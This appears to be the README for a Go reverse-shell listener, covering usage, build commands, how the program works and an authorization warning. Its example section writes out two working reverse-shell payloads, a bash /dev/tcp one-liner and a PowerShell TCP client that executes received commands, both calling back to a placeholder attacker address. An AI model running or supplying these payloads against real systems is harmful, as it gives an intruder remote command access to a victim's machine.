# Netcat-like Reverse Shell Handler

A Go implementation of a netcat-like tool for handling reverse shell connections. This tool listens on a specified port and maps stdin/stdout to incoming connections, making it useful for managing reverse shells.

## Features

- Listen on any port and host interface
- Bidirectional I/O mapping between terminal and network connection
- Support for multiple concurrent connections
- Graceful shutdown with Ctrl+C
- Simple command-line interface

## Usage

### Basic Usage

```bash
# Listen on default port 4444 on all interfaces
go run main.go

# Listen on specific port
go run main.go -p 8080

# Listen on specific host and port
go run main.go -h 127.0.0.1 -p 9999
```

### Command Line Options

- `-p <port>`: Port to listen on (default: 4444)
- `-h <host>`: Host/interface to bind to (default: 0.0.0.0)

## Building

```bash
# Build the executable
go build -o netcat main.go

# Run the built executable
./netcat -p 4444
```

## Example Scenarios

### 1. Reverse Shell Handler

**Step 1**: Start the listener
```bash
go run main.go -p 4444
```

**Step 2**: From target machine, connect back with a shell
```bash
# Linux/Mac
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Windows PowerShell
$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 2. Simple Chat/Communication

Use this tool to create a simple bidirectional communication channel between two systems.

## How It Works

1. **Listener Setup**: The program binds to the specified host and port
2. **Connection Handling**: Each incoming connection is handled in a separate goroutine
3. **Bidirectional Mapping**: 
   - Data from the network connection is written to stdout
   - Data from stdin is sent to the network connection
4. **Concurrent Support**: Multiple connections can be handled simultaneously

## Security Considerations

⚠️ **Warning**: This tool is designed for educational purposes and authorized testing only. Always ensure you have proper authorization before using this tool in any environment.

- Only use on networks you own or have explicit permission to test
- Be aware that this creates an open port that accepts connections
- Consider firewall rules and network security when running
- Use only for legitimate security testing and educational purposes

## Code Structure

- `main()`: Sets up the listener and handles graceful shutdown
- `handleConnection()`: Manages bidirectional I/O for each connection
- Uses goroutines for concurrent connection handling
- Implements proper error handling and resource cleanup

## Dependencies

This tool uses only Go standard library packages:
- `net` - for network operations
- `io` - for I/O operations  
- `os` - for system operations
- `flag` - for command-line parsing
- `sync` - for synchronization